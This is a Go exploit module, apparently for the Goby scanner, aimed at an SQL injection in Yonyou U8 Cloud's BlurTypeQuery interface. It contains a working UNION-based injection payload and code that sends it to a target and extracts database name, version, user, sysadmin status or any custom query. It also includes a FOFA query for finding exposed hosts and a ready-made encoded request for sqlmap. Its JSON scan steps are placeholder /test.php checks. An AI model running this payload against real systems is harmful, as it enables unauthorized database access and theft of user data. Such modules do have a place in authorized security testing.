package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8-Cloud /nc.itf.iufo.mobilereport.data.BlurTypeQuery SQL Injection Vulnerability",
    "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.  </p><p>There is an SQL injection vulnerability in the Yonyou U8 Cloud BlurTypeQuery interface, through which an unauthorized attacker can obtain database permissions, thereby stealing user data and causing user information leakage.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-02-27",
    "PostTime": "2024-11-20",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "GobyQuery": "title=\"U8C\" && body=\"U8 cloud\"",
    "Level": "1",
    "Impact": "<p>There is an SQL injection vulnerability in the Yonyou U8 Cloud BlurTypeQuery interface, through which an unauthorized attacker can obtain database permissions, thereby stealing user data and causing user information leakage.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/136329188"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT @@version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "用友U8 Cloud /nc.itf.iufo.mobilereport.data.BlurTypeQuery SQL 注入漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p>用友U8 Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。&nbsp;</p><p>用友U8 Cloud BlurTypeQuery接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友U8 Cloud BlurTypeQuery接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yonyou-U8-Cloud /nc.itf.iufo.mobilereport.data.BlurTypeQuery SQL Injection Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>Yonyou U8 Cloud is a new generation of cloud ERP launched by Yonyou, which mainly focuses on growing and innovative enterprises and provides enterprise-level cloud ERP overall solutions.&nbsp;&nbsp;</p><p>There is an SQL injection vulnerability in the Yonyou U8 Cloud BlurTypeQuery interface, through which an unauthorized attacker can obtain database permissions, thereby stealing user data and causing user information leakage.</p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability in the Yonyou U8 Cloud BlurTypeQuery interface, through which an unauthorized attacker can obtain database permissions, thereby stealing user data and causing user information leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9973"
}`

	setSqlPayloadHashasfuihagyusdfhoasyuffsdhuhfgaisuhgauighahidguayhsifgj := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		rawpayload := "1') UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(106)+(" + sql + ")+CHAR(112)+CHAR(107)+CHAR(106)+CHAR(113),NULL,NULL,NULL--"
		urlget := "/service/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?usercode=5&queryKey=" + url.QueryEscape(rawpayload)

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/service/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "ufikopapiXv"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := " SELECT CHAR(117)+CHAR(102)+CHAR(105)+CHAR(107)+CHAR(111)+CHAR(112)+CHAR(97)+CHAR(112)+CHAR(105)+CHAR(88)+CHAR(118)"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `qqxj([\s\S]*?)pkjq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasfuihagyusdfhoasyuffsdhuhfgaisuhgauighahidguayhsifgj
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `GET /service/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?usercode=5&queryKey=%31%27%29%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%31%33%29%2b%43%48%41%52%28%31%32%30%29%2b%43%48%41%52%28%31%30%36%29%2b%28%43%48%41%52%28%31%31%37%29%2b%43%48%41%52%28%31%30%32%29%2b%43%48%41%52%28%31%30%35%29%2b%43%48%41%52%28%31%30%37%29%2b%43%48%41%52%28%31%31%31%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%39%37%29%2b%43%48%41%52%28%31%31%32%29%2b%43%48%41%52%28%31%30%35%29%2b%43%48%41%52%28%38%38%29%2b%43%48%41%52%28%31%31%38%29%29%2b%43%48%41%52%28%31%30%37%29%2b%43%48%41%52%28%31%30%36%29%2b%43%48%41%52%28%31%31%33%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `qqxj([\s\S]*?)pkjq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasfuihagyusdfhoasyuffsdhuhfgaisuhgauighahidguayhsifgj
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DB_NAME()"
					} else if way == "db_version" {
						sql = "SELECT @@version"
					} else if way == "user_name" {
						sql = "SELECT user"
					} else if way == "is_admin" {
						sql = "SELECT IS_SRVROLEMEMBER('sysadmin')"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
